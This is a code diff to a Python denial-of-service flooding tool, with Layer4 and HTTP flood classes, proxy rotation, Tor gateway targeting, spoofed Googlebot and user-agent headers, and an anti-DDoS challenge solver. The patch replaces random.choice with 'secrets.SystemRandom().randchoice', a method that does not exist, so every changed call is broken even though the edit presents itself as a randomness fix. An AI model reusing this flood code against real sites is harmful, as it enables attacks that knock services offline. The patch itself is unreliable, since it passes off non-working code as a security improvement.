@@ -10,7 +10,6 @@ from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from re import compile
-from random import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
@@ -36,6 +35,7 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+import secrets
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -417,7 +417,7 @@ class Layer4(Thread):
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
         if self._proxies:
-            s = randchoice(self._proxies).open_socket(
+            s = secrets.SystemRandom().randchoice(self._proxies).open_socket(
                 conn_type, sock_type, proto_type)
         else:
             s = socket(conn_type, sock_type, proto_type)
@@ -758,7 +758,7 @@ class HttpFlood(Thread):
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+                                                      target.raw_path_qs, secrets.SystemRandom().randchoice(['1.0', '1.1', '1.2']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -803,7 +803,7 @@ class HttpFlood(Thread):
 
     def open_connection(self, host=None) -> socket:
         if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
+            sock = secrets.SystemRandom().randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
         else:
             sock = socket(AF_INET, SOCK_STREAM)
 
@@ -821,8 +821,8 @@ class HttpFlood(Thread):
 
     @property
     def randHeadercontent(self) -> str:
-        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
-                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
+        return (f"User-Agent: {secrets.SystemRandom().randchoice(self._useragents)}\r\n"
+                f"Referrer: {secrets.SystemRandom().randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                 self.SpoofIP)
 
     @staticmethod
@@ -847,7 +847,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def TOR(self) -> None:
-        provider = "." + randchoice(tor2webs)
+        provider = "." + secrets.SystemRandom().randchoice(tor2webs)
         target = self._target.authority.replace(".onion", provider)
         payload: Any = str.encode(self._payload +
                                   f"Host: {target}\r\n" +
@@ -942,14 +942,14 @@ class HttpFlood(Thread):
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: text/plain,text/html,*/*\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "User-Agent: %s\r\n" % secrets.SystemRandom().randchoice(google_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
             "GET /sitemap.xml HTTP/1.1\r\n"
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: */*\r\n"
             "From: googlebot(at)googlebot.com\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "User-Agent: %s\r\n" % secrets.SystemRandom().randchoice(google_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n"
             "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                           ProxyTools.Random.rand_str(4)) +
@@ -982,7 +982,7 @@ class HttpFlood(Thread):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
-            pro = randchoice(self._proxies)
+            pro = secrets.SystemRandom().randchoice(self._proxies)
         s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
@@ -1023,8 +1023,8 @@ class HttpFlood(Thread):
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
             if self._proxies:
-                pro = randchoice(self._proxies)
-                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
+                pro = secrets.SystemRandom().randchoice(self._proxies)
+                with Tools.dgb_solver(self._target.human_repr(), secrets.SystemRandom().randchoice(self._useragents), pro.asRequest()) as ss:
                     for _ in range(min(self._rpc, 5)):
                         sleep(min(self._rpc, 5) / 100)
                         with ss.get(self._target.human_repr(),
@@ -1035,7 +1035,7 @@ class HttpFlood(Thread):
 
                 Tools.safe_close(ss)
 
-            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
+            with Tools.dgb_solver(self._target.human_repr(), secrets.SystemRandom().randchoice(self._useragents)) as ss:
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
                     with ss.get(self._target.human_repr()) as res:
@@ -1074,7 +1074,7 @@ class HttpFlood(Thread):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
-            pro = randchoice(self._proxies)
+            pro = secrets.SystemRandom().randchoice(self._proxies)
         s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
@@ -1114,7 +1114,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def RHEX(self):
-        randhex = str(randbytes(randchoice([32, 64, 128])))
+        randhex = str(randbytes(secrets.SystemRandom().randchoice([32, 64, 128])))
         payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                         self._target.authority,
                                                         randhex) +
@@ -1194,7 +1194,7 @@ class HttpFlood(Thread):
             'Without proxies you can use github.com/codesenberg/bombardier'
 
         while True:
-            proxy = randchoice(self._proxies)
+            proxy = secrets.SystemRandom().randchoice(self._proxies)
             if proxy.type != ProxyType.SOCKS4:
                 break
 
@@ -1509,7 +1509,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     if proxy_ty not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
     if proxy_ty == 6:
-        proxy_ty = randchoice([4, 5, 1])
+        proxy_ty = secrets.SystemRandom().randchoice([4, 5, 1])
     if not proxy_li.exists():
         logger.warning(
             f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
